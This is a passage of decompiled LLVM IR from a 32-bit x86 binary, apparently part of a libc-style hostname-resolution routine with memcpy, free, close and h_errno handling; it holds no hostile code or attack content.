  %v1_805611d = load i32, i32* @esp, align 4
  %v2_805611d = add i32 %v1_805611d, 148
  %v3_805611d = inttoptr i32 %v2_805611d to i32*
  store i32 %v3_805611a, i32* %v3_805611d, align 4
  %v0_8056124 = load i32, i32* @edi, align 4
  %v1_8056124 = add i32 %v0_8056124, 36
  %v2_8056124 = inttoptr i32 %v1_8056124 to i32*
  %v3_8056124 = load i32, i32* %v2_8056124, align 4
  store i32 %v3_8056124, i32* %eax.global-to-local, align 4
  %v1_8056127 = load i32, i32* @esp, align 4
  %v2_8056127 = add i32 %v1_8056127, 152
  %v3_8056127 = inttoptr i32 %v2_8056127 to i32*
  store i32 %v3_8056124, i32* %v3_8056127, align 4
  %v0_805612e = load i32, i32* @ecx, align 4
  %v1_805612e = load i32, i32* @esp, align 4
  %v2_805612e = add i32 %v1_805612e, -4
  %v3_805612e = inttoptr i32 %v2_805612e to i32*
  store i32 %v0_805612e, i32* %v3_805612e, align 4
  %v1_805612f = add i32 %v1_805612e, -8
  %v2_805612f = inttoptr i32 %v1_805612f to i32*
  store i32 40, i32* %v2_805612f, align 4
  %v1_8056131 = add i32 %v1_805612e, 116
  store i32 %v1_8056131, i32* %edx.global-to-local, align 4
  %v2_8056135 = add i32 %v1_805612e, -12
  %v3_8056135 = inttoptr i32 %v2_8056135 to i32*
  store i32 %v1_8056131, i32* %v3_8056135, align 4
  %v0_8056136 = load i32, i32* @edi, align 4
  %v2_8056136 = add i32 %v1_805612e, -16
  %v3_8056136 = inttoptr i32 %v2_8056136 to i32*
  store i32 %v0_8056136, i32* %v3_8056136, align 4
  %v5_8056137 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v5_8056137, i32* %eax.global-to-local, align 4
  %v0_805613c = load i32, i32* @edi, align 4
  %v1_805613c = add i32 %v0_805613c, 4
  %v2_805613c = inttoptr i32 %v1_805613c to i32*
  %v3_805613c = load i32, i32* %v2_805613c, align 4
  store i32 %v3_805613c, i32* %eax.global-to-local, align 4
  %v0_805613f = load i32, i32* @esp, align 4
  %v1_805613f = add i32 %v0_805613f, 16
  %v9_8056142 = icmp eq i32 %v3_805613c, 24
  br i1 %v9_8056142, label %dec_label_pc_8056110.dec_label_pc_8056169_crit_edge, label %dec_label_pc_8056147

dec_label_pc_8056110.dec_label_pc_8056169_crit_edge: ; preds = %dec_label_pc_8056110
  %.pre24 = add i32 %v0_805613f, 260
  %.pre25 = inttoptr i32 %.pre24 to i32*
  %v4_8056169.pre = load i32, i32* %.pre25, align 4
  br label %dec_label_pc_8056169

dec_label_pc_8056147:                             ; preds = %dec_label_pc_8056110
  %v1_8056147 = add i32 %v0_805613c, 28
  %v2_8056147 = inttoptr i32 %v1_8056147 to i32*
  %v3_8056147 = load i32, i32* %v2_8056147, align 4
  %v4_8056147 = icmp eq i32 %v3_8056147, 0
  br i1 %v4_8056147, label %dec_label_pc_8056206, label %dec_label_pc_8056151

dec_label_pc_8056151:                             ; preds = %dec_label_pc_8056147
  %v1_8056151 = add i32 %v0_805613f, 260
  %v2_8056151 = inttoptr i32 %v1_8056151 to i32*
  %v3_8056151 = load i32, i32* %v2_8056151, align 4
  %v12_8056151 = icmp eq i32 %v3_8056151, 1
  br i1 %v12_8056151, label %dec_label_pc_8056169, label %dec_label_pc_805615b

dec_label_pc_805615b:                             ; preds = %dec_label_pc_8056151
  %v12_805615b = icmp eq i32 %v3_8056151, 28
  %v1_8056163 = icmp eq i1 %v12_805615b, false
  br i1 %v1_8056163, label %dec_label_pc_8056206, label %dec_label_pc_8056169

dec_label_pc_8056169:                             ; preds = %dec_label_pc_8056110.dec_label_pc_8056169_crit_edge, %dec_label_pc_805615b, %dec_label_pc_8056151
  %v4_8056169 = phi i32 [ %v4_8056169.pre, %dec_label_pc_8056110.dec_label_pc_8056169_crit_edge ], [ %v3_8056151, %dec_label_pc_805615b ], [ 1, %dec_label_pc_8056151 ]
  %v15_8056169 = icmp eq i32 %v3_805613c, %v4_8056169
  br i1 %v15_8056169, label %dec_label_pc_805617e, label %dec_label_pc_8056172

dec_label_pc_8056172:                             ; preds = %dec_label_pc_8056169
  %v1_8056175 = inttoptr i32 %v0_805613c to i32*
  %v2_8056175 = load i32, i32* %v1_8056175, align 4
  %v5_8056175 = inttoptr i32 %v0_805613f to i32*
  store i32 %v2_8056175, i32* %v5_8056175, align 4
  %v1_8056177 = call i32 @free(i32 -1)
  store i32 %v1_8056177, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80561ee

dec_label_pc_805617e:                             ; preds = %dec_label_pc_8056169
  %v0_805617e = load i32, i32* @ebx, align 4
  %v1_8056180 = sub i32 -1, %v0_805617e
  store i32 %v1_8056180, i32* %eax.global-to-local, align 4
  %v2_8056182 = add i32 %v0_805613f, 120
  %v3_8056182 = inttoptr i32 %v2_8056182 to i32*
  %v4_8056182 = load i32, i32* %v3_8056182, align 4
  %v5_8056182 = add i32 %v4_8056182, %v1_8056180
  store i32 %v5_8056182, i32* %eax.global-to-local, align 4
  %v2_8056186 = add i32 %v0_805613c, 36
  %v3_8056186 = inttoptr i32 %v2_8056186 to i32*
  store i32 %v5_8056182, i32* %v3_8056186, align 4
  %v0_8056189 = load i32, i32* @edi, align 4
  %v1_8056189 = add i32 %v0_8056189, 16
  %v2_8056189 = inttoptr i32 %v1_8056189 to i32*
  %v3_8056189 = load i32, i32* %v2_8056189, align 4
  %v1_805618c = add i32 %v3_8056189, 4
  store i32 %v1_805618c, i32* %eax.global-to-local, align 4
  %v2_805618f = add i32 %v0_8056189, 36
  %v3_805618f = inttoptr i32 %v2_805618f to i32*
  %v4_805618f = load i32, i32* %v3_805618f, align 4
  %v7_805618f = mul i32 %v4_805618f, %v1_805618c
  store i32 %v7_805618f, i32* %eax.global-to-local, align 4
  %v2_8056193 = add i32 %v0_8056189, 32
  %v3_8056193 = inttoptr i32 %v2_8056193 to i32*
  %v4_8056193 = load i32, i32* %v3_8056193, align 4
  %v6_8056196 = icmp ugt i32 %v7_805618f, %v4_8056193
  br i1 %v6_8056196, label %dec_label_pc_805617e.dec_label_pc_8056206.loopexit_crit_edge, label %dec_label_pc_8056198

dec_label_pc_805617e.dec_label_pc_8056206.loopexit_crit_edge: ; preds = %dec_label_pc_805617e
  %v0_8056206.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056206

dec_label_pc_8056198:                             ; preds = %dec_label_pc_805617e
  store i32 0, i32* %v3_805618f, align 4
  %v0_805619f = load i32, i32* @esp, align 4
  %v1_805619f = add i32 %v0_805619f, 27
  %v2_805619f = inttoptr i32 %v1_805619f to i8*
  store i8 0, i8* %v2_805619f, align 1
  %v1_80561f1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80561f1

dec_label_pc_80561a6:                             ; preds = %dec_label_pc_8056105
  %v1_80561a9 = add i32 %v0_80560e6, 132
  %v2_80561a9 = inttoptr i32 %v1_80561a9 to i32*
  %v3_80561a9 = load i32, i32* %v2_80561a9, align 4
  %v6_80561a9 = inttoptr i32 %v0_80560e6 to i32*
  store i32 %v3_80561a9, i32* %v6_80561a9, align 4
  %v1_80561b0 = call i32 @free(i32 -1)
  store i32 %v1_80561b0, i32* %eax.global-to-local, align 4
  %v0_80561b5 = load i32, i32* @esp, align 4
  %v1_80561b5 = add i32 %v0_80561b5, 16
  %v1_80561b8 = add i32 %v0_80561b5, 260
  %v2_80561b8 = inttoptr i32 %v1_80561b8 to i32*
  %v3_80561b8 = load i32, i32* %v2_80561b8, align 4
  store i32 %v3_80561b8, i32* %eax.global-to-local, align 4
  %v1_80561bf = add i32 %v0_80561b5, 136
  %v2_80561bf = inttoptr i32 %v1_80561bf to i32*
  %v3_80561bf = load i32, i32* %v2_80561bf, align 4
  %v15_80561bf = icmp eq i32 %v3_80561bf, %v3_80561b8
  %v1_80561c3 = icmp eq i1 %v15_80561bf, false
  br i1 %v1_80561c3, label %dec_label_pc_80561f1, label %dec_label_pc_80561c5

dec_label_pc_80561c5:                             ; preds = %dec_label_pc_80561a6
  %v0_80561c5 = load i32, i32* @edi, align 4
  %v1_80561c5 = add i32 %v0_80561c5, 16
  %v2_80561c5 = inttoptr i32 %v1_80561c5 to i32*
  %v3_80561c5 = load i32, i32* %v2_80561c5, align 4
  store i32 %v3_80561c5, i32* %eax.global-to-local, align 4
  %v2_80561c8 = add i32 %v0_80561b5, 148
  %v3_80561c8 = inttoptr i32 %v2_80561c8 to i32*
  %v4_80561c8 = load i32, i32* %v3_80561c8, align 4
  %v15_80561c8 = icmp eq i32 %v3_80561c5, %v4_80561c8
  %v1_80561cf = icmp eq i1 %v15_80561c8, false
  br i1 %v1_80561cf, label %dec_label_pc_805628b, label %dec_label_pc_80561d5

dec_label_pc_80561d5:                             ; preds = %dec_label_pc_80561c5
  %v0_80561d5 = load i32, i32* @edx, align 4
  %v2_80561d5 = add i32 %v0_80561b5, 12
  %v3_80561d5 = inttoptr i32 %v2_80561d5 to i32*
  store i32 %v0_80561d5, i32* %v3_80561d5, align 4
  %v0_80561d6 = load i32, i32* %eax.global-to-local, align 4
  %v2_80561d6 = add i32 %v0_80561b5, 8
  %v3_80561d6 = inttoptr i32 %v2_80561d6 to i32*
  store i32 %v0_80561d6, i32* %v3_80561d6, align 4
  %v1_80561d7 = add i32 %v0_80561b5, 152
  %v2_80561d7 = inttoptr i32 %v1_80561d7 to i32*
  %v3_80561d7 = load i32, i32* %v2_80561d7, align 4
  %v5_80561d7 = add i32 %v0_80561b5, 4
  %v6_80561d7 = inttoptr i32 %v5_80561d7 to i32*
  store i32 %v3_80561d7, i32* %v6_80561d7, align 4
  %v0_80561de = load i32, i32* %eax.global-to-local, align 4
  %v1_80561de = load i32, i32* @edi, align 4
  %v2_80561de = add i32 %v1_80561de, 36
  %v3_80561de = inttoptr i32 %v2_80561de to i32*
  %v4_80561de = load i32, i32* %v3_80561de, align 4
  %v7_80561de = mul i32 %v4_80561de, %v0_80561de
  store i32 %v7_80561de, i32* %eax.global-to-local, align 4
  %v2_80561e2 = add i32 %v1_80561de, 28
  %v3_80561e2 = inttoptr i32 %v2_80561e2 to i32*
  %v4_80561e2 = load i32, i32* %v3_80561e2, align 4
  %v5_80561e2 = add i32 %v4_80561e2, %v7_80561de
  store i32 %v5_80561e2, i32* %eax.global-to-local, align 4
  %v3_80561e5 = inttoptr i32 %v0_80561b5 to i32*
  store i32 %v5_80561e2, i32* %v3_80561e5, align 4
  %v5_80561e6 = call i32 @memcpy(i16* inttoptr (i32 -1 to i16*), i32 %v15_8055d24, i32 %v3_8055d83)
  store i32 %v5_80561e6, i32* %eax.global-to-local, align 4
  %v0_80561eb = load i32, i32* @edi, align 4
  %v1_80561eb = add i32 %v0_80561eb, 36
  %v2_80561eb = inttoptr i32 %v1_80561eb to i32*
  %v3_80561eb = load i32, i32* %v2_80561eb, align 4
  %v4_80561eb = add i32 %v3_80561eb, 1
  store i32 %v4_80561eb, i32* %v2_80561eb, align 4
  br label %dec_label_pc_80561ee

dec_label_pc_80561ee:                             ; preds = %dec_label_pc_8056172, %dec_label_pc_80561d5
  %v0_80561ee = load i32, i32* @esp, align 4
  %v1_80561ee = add i32 %v0_80561ee, 16
  br label %dec_label_pc_80561f1

dec_label_pc_80561f1:                             ; preds = %dec_label_pc_80561a6, %dec_label_pc_8056198, %dec_label_pc_80561ee
  %v1_80561f1 = phi i32 [ %v1_80561b5, %dec_label_pc_80561a6 ], [ %v1_80561f1.pre, %dec_label_pc_8056198 ], [ %v1_80561ee, %dec_label_pc_80561ee ]
  %v0_80561f1 = load i32, i32* @esi, align 4
  %v2_80561f1 = add i32 %v1_80561f1, 52
  %v3_80561f1 = inttoptr i32 %v2_80561f1 to i32*
  %v4_80561f1 = load i32, i32* %v3_80561f1, align 4
  %v5_80561f1 = add i32 %v4_80561f1, %v0_80561f1
  store i32 %v5_80561f1, i32* @esi, align 4
  %v0_80561f5 = load i32, i32* @ebx, align 4
  %v1_80561f5 = add i32 %v0_80561f5, 1
  store i32 %v1_80561f5, i32* @ebx, align 4
  %v2_80561f6 = add i32 %v1_80561f1, 104
  %v3_80561f6 = inttoptr i32 %v2_80561f6 to i32*
  %v4_80561f6 = load i32, i32* %v3_80561f6, align 4
  %v5_80561f6 = sub i32 %v1_80561f5, %v4_80561f6
  %v11_80561f6 = xor i32 %v4_80561f6, %v1_80561f5
  %v12_80561f6 = xor i32 %v5_80561f6, %v1_80561f5
  %v13_80561f6 = and i32 %v12_80561f6, %v11_80561f6
  %v14_80561f6 = icmp slt i32 %v13_80561f6, 0
  %v16_80561f6 = icmp slt i32 %v5_80561f6, 0
  %v2_80561fa = icmp eq i1 %v16_80561f6, %v14_80561f6
  br i1 %v2_80561fa, label %dec_label_pc_8056206, label %dec_label_pc_80561fc

dec_label_pc_80561fc:                             ; preds = %dec_label_pc_80561fc.lr.ph, %dec_label_pc_80561f1
  %v0_80561fc = phi i32 [ %v0_80561fc.pre, %dec_label_pc_80561fc.lr.ph ], [ %v5_80561f1, %dec_label_pc_80561f1 ]
  %v0_80560d281 = phi i32 [ %v1_80561f6.pre, %dec_label_pc_80561fc.lr.ph ], [ %v1_80561f1, %dec_label_pc_80561f1 ]
  %v2_80561fc = add i32 %v0_80560d281, 16
  %v3_80561fc = inttoptr i32 %v2_80561fc to i32*
  %v4_80561fc = load i32, i32* %v3_80561fc, align 4
  %v5_80561fc = sub i32 %v0_80561fc, %v4_80561fc
  %v11_80561fc = xor i32 %v4_80561fc, %v0_80561fc
  %v12_80561fc = xor i32 %v5_80561fc, %v0_80561fc
  %v13_80561fc = and i32 %v12_80561fc, %v11_80561fc
  %v14_80561fc = icmp slt i32 %v13_80561fc, 0
  %v16_80561fc = icmp slt i32 %v5_80561fc, 0
  %v2_8056200 = icmp eq i1 %v16_80561fc, %v14_80561fc
  br i1 %v2_8056200, label %dec_label_pc_8056206, label %dec_label_pc_80560d2

dec_label_pc_8056206:                             ; preds = %dec_label_pc_80560f5, %dec_label_pc_80560c6, %dec_label_pc_80561f1, %dec_label_pc_8056147, %dec_label_pc_805615b, %dec_label_pc_80561fc, %dec_label_pc_805617e.dec_label_pc_8056206.loopexit_crit_edge
  %v0_8056206 = phi i32 [ %v0_8056206.pre.pre, %dec_label_pc_805617e.dec_label_pc_8056206.loopexit_crit_edge ], [ %v1_80561f6.pre, %dec_label_pc_80560c6 ], [ %v1_80561f1, %dec_label_pc_80561f1 ], [ %v1_805613f, %dec_label_pc_8056147 ], [ %v1_805613f, %dec_label_pc_805615b ], [ %v0_80560d281, %dec_label_pc_80561fc ], [ %v1_80560e6, %dec_label_pc_80560f5 ]
  %v1_8056209 = add i32 %v0_8056206, 20
  %v2_8056209 = inttoptr i32 %v1_8056209 to i32*
  %v3_8056209 = load i32, i32* %v2_8056209, align 4
  %v5_8056209 = add i32 %v0_8056206, -16
  %v6_8056209 = inttoptr i32 %v5_8056209 to i32*
  store i32 %v3_8056209, i32* %v6_8056209, align 4
  %v1_805620d = call i32 @__libc_close(i32 -1)
  store i32 %v1_805620d, i32* %eax.global-to-local, align 4
  %v0_8056212 = load i32, i32* @esp, align 4
  %v1_8056215 = add i32 %v0_8056212, 272
  %v2_8056215 = inttoptr i32 %v1_8056215 to i32*
  %v3_8056215 = load i32, i32* %v2_8056215, align 4
  %v4_8056215 = icmp eq i32 %v3_8056215, 0
  br i1 %v4_8056215, label %dec_label_pc_805622a, label %dec_label_pc_805621f

dec_label_pc_805621f:                             ; preds = %dec_label_pc_8056206
  store i32 %v3_8056215, i32* %edx.global-to-local, align 4
  %v2_8056226 = inttoptr i32 %v3_8056215 to i32*
  store i32 %v2_8055c96, i32* %v2_8056226, align 4
  %v0_8056236.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056236

dec_label_pc_805622a:                             ; preds = %dec_label_pc_8056206
  %v3_805622d = inttoptr i32 %v0_8056212 to i32*
  store i32 %v2_8055c96, i32* %v3_805622d, align 4
  %v1_805622e = call i32 @free(i32 -1)
  store i32 %v1_805622e, i32* %eax.global-to-local, align 4
  %v0_8056233 = load i32, i32* @esp, align 4
  %v1_8056233 = add i32 %v0_8056233, 16
  br label %dec_label_pc_8056236

dec_label_pc_8056236:                             ; preds = %dec_label_pc_805621f, %dec_label_pc_805622a
  %v0_8056236 = phi i32 [ %v0_8056236.pre, %dec_label_pc_805621f ], [ %v1_8056233, %dec_label_pc_805622a ]
  %v1_8056239 = add i32 %v0_8056236, 12
  %v2_8056239 = inttoptr i32 %v1_8056239 to i32*
  %v3_8056239 = load i32, i32* %v2_8056239, align 4
  %v5_8056239 = add i32 %v0_8056236, -16
  %v6_8056239 = inttoptr i32 %v5_8056239 to i32*
  store i32 %v3_8056239, i32* %v6_8056239, align 4
  %v1_805623d = call i32 @free(i32 -1)
  store i32 %v1_805623d, i32* @eax, align 4
  %v0_8056242 = load i32, i32* @esp, align 4
  %v1_8056245 = add i32 %v0_8056242, 8
  %v2_8056245 = inttoptr i32 %v1_8056245 to i32*
  store i32 ptrtoint (i8** @global_var_8065b28.1015 to i32), i32* %v2_8056245, align 4
  %v1_805624a = add i32 %v0_8056242, 4
  %v2_805624a = inttoptr i32 %v1_805624a to i32*
  store i32 134564427, i32* %v2_805624a, align 4
  %v1_805624f = add i32 %v0_8056242, 200
  store i32 %v1_805624f, i32* %ebx.global-to-local, align 4
  %v3_8056256 = inttoptr i32 %v0_8056242 to i32*
  store i32 %v1_805624f, i32* %v3_8056256, align 4
  %v2_8056257 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_8056257, i32* %eax.global-to-local, align 4
  %v0_805625c = load i32, i32* @esp, align 4
  %v1_805625c = inttoptr i32 %v0_805625c to i32*
  store i32 ptrtoint (i8** @global_var_8065b28.1015 to i32), i32* %v1_805625c, align 4
  %v1_8056263 = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_8056263, i32* %eax.global-to-local, align 4
  %v0_8056268 = load i32, i32* @esp, align 4
  %v1_8056268 = add i32 %v0_8056268, 56
  %v2_8056268 = inttoptr i32 %v1_8056268 to i32*
  %v3_8056268 = load i32, i32* %v2_8056268, align 4
  store i32 %v3_8056268, i32* @eax, align 4
  %v1_805626c = add i32 %v0_8056268, 72
  %v2_805626c = inttoptr i32 %v1_805626c to i32*
  %v3_805626c = load i32, i32* %v2_805626c, align 4
  store i32 %v3_805626c, i32* %edx.global-to-local, align 4
  %v1_8056270 = inttoptr i32 %v0_8056268 to i32*
  %v3_8056270 = add i32 %v0_8056268, 4
  %v1_8056271 = inttoptr i32 %v3_8056270 to i32*
  store i32 1, i32* %v1_8056271, align 4
  %v0_8056274 = load i32, i32* @eax, align 4
  %v1_8056274 = sext i32 %v0_8056274 to i64
  store i64 %v1_8056274, i64* @global_var_8065b40.1016, align 64
  %v0_8056279 = load i32, i32* %edx.global-to-local, align 4
  %v1_8056279 = trunc i32 %v0_8056279 to i16
  store i16 %v1_8056279, i16* @global_var_805f884.1017, align 4
  %v0_8056280 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8056280, i32* %v1_8056270, align 4
  %v2_8056281 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_8056281, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80563c2

dec_label_pc_805628b:                             ; preds = %dec_label_pc_80561c5
  %v1_805628e = inttoptr i32 %v0_80561c5 to i32*
  %v2_805628e = load i32, i32* %v1_805628e, align 4
  %v5_805628e = inttoptr i32 %v0_80561b5 to i32*
  store i32 %v2_805628e, i32* %v5_805628e, align 4
  %v1_8056290 = call i32 @free(i32 -1)
  store i32 %v1_8056290, i32* @eax, align 4
  %v0_8056295 = load i32, i32* @esp, align 4
  %v1_8056295 = add i32 %v0_8056295, 16
  br label %dec_label_pc_8056298

dec_label_pc_8056298:                             ; preds = %dec_label_pc_8055fca, %dec_label_pc_80560f5, %dec_label_pc_80560ed, %dec_label_pc_8056089, %dec_label_pc_805600f, %dec_label_pc_8055feb, %dec_label_pc_805628b
  %v1_805629f = phi i32 [ %v1_8055fdf, %dec_label_pc_8055fca ], [ %v1_80560e6, %dec_label_pc_80560f5 ], [ %v1_80560e6, %dec_label_pc_80560ed ], [ %v1_8056000, %dec_label_pc_8056089 ], [ %v1_8056000, %dec_label_pc_805600f ], [ %v1_8056000, %dec_label_pc_8055feb ], [ %v1_8056295, %dec_label_pc_805628b ]
  %v1_8056298 = add i32 %v1_805629f, 51
  %v2_8056298 = inttoptr i32 %v1_8056298 to i8*
  %v3_8056298 = load i8, i8* %v2_8056298, align 1
  %v4_8056298 = icmp eq i8 %v3_8056298, 0
  %v1_805629d = icmp eq i1 %v4_8056298, false
  br i1 %v1_805629d, label %dec_label_pc_80562e3, label %dec_label_pc_805629f

dec_label_pc_805629f:                             ; preds = %dec_label_pc_8056298
  %v0_805629f = load i32, i32* @ecx, align 4
  %v2_805629f = add i32 %v1_805629f, -4
  %v3_805629f = inttoptr i32 %v2_805629f to i32*
  store i32 %v0_805629f, i32* %v3_805629f, align 4
  %v1_80562a0 = add i32 %v1_805629f, -8
  %v2_80562a0 = inttoptr i32 %v1_80562a0 to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v2_80562a0, align 4
  %v1_80562a5 = add i32 %v1_805629f, -12
  %v2_80562a5 = inttoptr i32 %v1_80562a5 to i32*
  store i32 134564427, i32* %v2_80562a5, align 4
  %v1_80562aa = add i32 %v1_805629f, 184
  store i32 %v1_80562aa, i32* @esi, align 4
  %v2_80562b1 = add i32 %v1_805629f, -16
  %v3_80562b1 = inttoptr i32 %v2_80562b1 to i32*
  store i32 %v1_80562aa, i32* %v3_80562b1, align 4
  %v2_80562b2 = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_80562b2, i32* %eax.global-to-local, align 4
  %v0_80562b7 = load i32, i32* @esp, align 4
  %v1_80562b7 = inttoptr i32 %v0_80562b7 to i32*
  store i32 ptrtoint (i32* @global_var_805f888.953 to i32), i32* %v1_80562b7, align 4
  %v1_80562be = call i32 @__pthread_return_0(i32 -1)
  store i32 %v1_80562be, i32* %eax.global-to-local, align 4
  %v0_80562c3 = load i32, i32* @esp, align 4
  %v1_80562c3 = inttoptr i32 %v0_80562c3 to i32*
  %v2_80562c3 = load i32, i32* %v1_80562c3, align 4
  store i32 %v2_80562c3, i32* @eax, align 4
  %v3_80562c3 = add i32 %v0_80562c3, 4
  %v1_80562c4 = inttoptr i32 %v3_80562c3 to i32*
  %v2_80562c4 = load i32, i32* %v1_80562c4, align 4
  store i32 %v2_80562c4, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_80562c4, align 4
  %v0_80562c7 = load i32, i32* @esi, align 4
  store i32 %v0_80562c7, i32* %v1_80562c3, align 4
  %v0_80562c8 = load i32, i32* @global_var_8065f78.1018, align 8
  store i32 %v0_80562c8, i32* %ebx.global-to-local, align 4
  %v2_80562ce = call i32 @__pthread_return_void(i32 -1, i32 %v15_8055d24)
  store i32 %v2_80562ce, i32* %eax.global-to-local, align 4
  %v0_80562d3 = load i32, i32* @esp, align 4
  %v1_80562d3 = add i32 %v0_80562d3, 16
  %v1_80562d6 = add i32 %v0_80562c8, -1
  store i32 %v1_80562d6, i32* @ebx, align 4
  %v1_80562d7 = add i32 %v0_80562d3, 52
  %v2_80562d7 = inttoptr i32 %v1_80562d7 to i32*
  %v3_80562d7 = load i32, i32* %v2_80562d7, align 4
  %v5_80562d7 = sub i32 %v3_80562d7, %v1_80562d6
  %v11_80562d7 = xor i32 %v3_80562d7, %v1_80562d6
  %v12_80562d7 = xor i32 %v5_80562d7, %v3_80562d7
  %v13_80562d7 = and i32 %v12_80562d7, %v11_80562d7
  %v14_80562d7 = icmp slt i32 %v13_80562d7, 0
  %v16_80562d7 = icmp slt i32 %v5_80562d7, 0
  %v2_80562db = icmp eq i1 %v16_80562d7, %v14_80562d7
  br i1 %v2_80562db, label %dec_label_pc_80562e3, label %dec_label_pc_80562dd

dec_label_pc_80562dd:                             ; preds = %dec_label_pc_805629f
  %v4_80562dd = add i32 %v3_80562d7, 1
  store i32 %v4_80562dd, i32* %v2_80562d7, align 4
  br label %dec_label_pc_8056304.backedge

dec_label_pc_80562e3:                             ; preds = %dec_label_pc_8055f6c, %dec_label_pc_805629f, %dec_label_pc_8056298, %dec_label_pc_8055f83
  %v1_80562f0 = phi i32 [ %v1_80562d3, %dec_label_pc_805629f ], [ %v1_805629f, %dec_label_pc_8056298 ], [ %v1_8055fbf, %dec_label_pc_8055f83 ], [ %v0_80562e3.pre, %dec_label_pc_8055f6c ]
  %v1_80562e3 = add i32 %v1_80562f0, 40
  %v2_80562e3 = inttoptr i32 %v1_80562e3 to i32*
  %v3_80562e3 = load i32, i32* %v2_80562e3, align 4
  %v1_80562e7 = add i32 %v3_80562e3, 1
  store i32 %v1_80562e7, i32* %eax.global-to-local, align 4
  %v1_80562e8 = ashr i32 %v1_80562e7, 31
  store i32 %v1_80562e8, i32* %edx.global-to-local, align 4
  %v1_80562e9 = add i32 %v1_80562f0, 248
  %v2_80562e9 = inttoptr i32 %v1_80562e9 to i32*
  %v3_80562e9 = load i32, i32* %v2_80562e9, align 4
  %v5_80562e9 = zext i32 %v1_80562e7 to i64
  %v7_80562e9 = zext i32 %v1_80562e8 to i64
  %v8_80562e9 = mul nuw i64 %v7_80562e9, 4294967296
  %v9_80562e9 = or i64 %v8_80562e9, %v5_80562e9
  %v10_80562e9 = zext i32 %v3_80562e9 to i64
  %v11_80562e9 = sdiv i64 %v9_80562e9, %v10_80562e9
  %v12_80562e9 = trunc i64 %v11_80562e9 to i32
  store i32 %v12_80562e9, i32* %eax.global-to-local, align 4
  %v13_80562e9 = srem i64 %v9_80562e9, %v10_80562e9
  %v14_80562e9 = trunc i64 %v13_80562e9 to i32
  store i32 %v14_80562e9, i32* %edx.global-to-local, align 4
  store i32 %v14_80562e9, i32* %v2_80562e3, align 4
  %v1_80562f4 = icmp eq i32 %v14_80562e9, 0
  %v1_80562f6 = icmp eq i1 %v1_80562f4, false
  br i1 %v1_80562f6, label %dec_label_pc_80562fc, label %dec_label_pc_80562f8

dec_label_pc_80562f8:                             ; preds = %dec_label_pc_80562e3
  %v0_80562f8 = load i32, i32* @esp, align 4
  %v1_80562f8 = add i32 %v0_80562f8, 28
  %v2_80562f8 = inttoptr i32 %v1_80562f8 to i32*
  %v3_80562f8 = load i32, i32* %v2_80562f8, align 4
  %v4_80562f8 = add i32 %v3_80562f8, 1
  store i32 %v4_80562f8, i32* %v2_80562f8, align 4
  br label %dec_label_pc_80562fc

dec_label_pc_80562fc:                             ; preds = %dec_label_pc_80562e3, %dec_label_pc_80562f8
  %v0_80562fc = load i32, i32* @esp, align 4
  %v1_80562fc = add i32 %v0_80562fc, 36
  %v2_80562fc = inttoptr i32 %v1_80562fc to i32*
  store i32 -1, i32* %v2_80562fc, align 4
  br label %dec_label_pc_8056304.backedge

dec_label_pc_8056304.backedge:                    ; preds = %dec_label_pc_80562fc, %dec_label_pc_8055f7a, %dec_label_pc_8056068, %dec_label_pc_80562dd
  %v0_8056304.pre = load i32, i32* @esp, align 4
  %v1_8056304 = add i32 %v0_8056304.pre, 28
  %v2_8056304 = inttoptr i32 %v1_8056304 to i32*
  %v3_8056304 = load i32, i32* %v2_8056304, align 4
  %tmp120 = icmp ult i32 %v3_8056304, 3
  br i1 %tmp120, label %dec_label_pc_8055d64, label %dec_label_pc_8056329

dec_label_pc_8056329:                             ; preds = %dec_label_pc_8055cde, %dec_label_pc_8055d7a, %dec_label_pc_8055e6e, %dec_label_pc_8056304.backedge, %entry, %dec_label_pc_8055cb8, %dec_label_pc_8055cc0, %dec_label_pc_8055cce
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8055cce ], [ -1, %dec_label_pc_8055cc0 ], [ -1, %dec_label_pc_8055cb8 ], [ -1, %entry ], [ %v0_8055d2b, %dec_label_pc_8056304.backedge ], [ %v0_8055d2b, %dec_label_pc_8055e6e ], [ %v0_8055d2b, %dec_label_pc_8055d7a ], [ %v0_8055d2b, %dec_label_pc_8055cde ]
  %v0_8056329 = call i32 @__GI___h_errno_location()
  store i32 %v0_8056329, i32* %eax.global-to-local, align 4
  %v1_805632e = inttoptr i32 %v0_8056329 to i32*
  store i32 -1, i32* %v1_805632e, align 4
  %v0_8056334 = load i32, i32* @esp, align 4
  %v1_8056334 = add i32 %v0_8056334, 44
  %v2_8056334 = inttoptr i32 %v1_8056334 to i32*
  %v3_8056334 = load i32, i32* %v2_8056334, align 4
  store i32 %v3_8056334, i32* %eax.global-to-local, align 4
  %v2_8056338 = add i32 %v0_8056334, 56
  %v3_8056338 = inttoptr i32 %v2_8056338 to i32*
  store i32 %v3_8056334, i32* %v3_8056338, align 4
  br label %dec_label_pc_805633c

dec_label_pc_805633c:                             ; preds = %dec_label_pc_80560a1, %dec_label_pc_8056079, %dec_label_pc_8056329
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_8056329 ], [ %v0_8055d2b, %dec_label_pc_80560a1 ], [ %v0_8055d2b, %dec_label_pc_8056079 ]
  %v0_805633c = load i32, i32* @esp, align 4
  %v1_805633c = add i32 %v0_805633c, 20
  %v2_805633c = inttoptr i32 %v1_805633c to i32*
  %v3_805633c = load i32, i32* %v2_805633c, align 4
  %v13_805633c = icmp eq i32 %v3_805633c, -1
  br i1 %v13_805633c, label %dec_label_pc_805633c.dec_label_pc_8056352_crit_edge, label %dec_label_pc_8056343

dec_label_pc_805633c.dec_label_pc_8056352_crit_edge: ; preds = %dec_label_pc_805633c
  %.pre = sext i16 %stack_var_-192.1 to i32
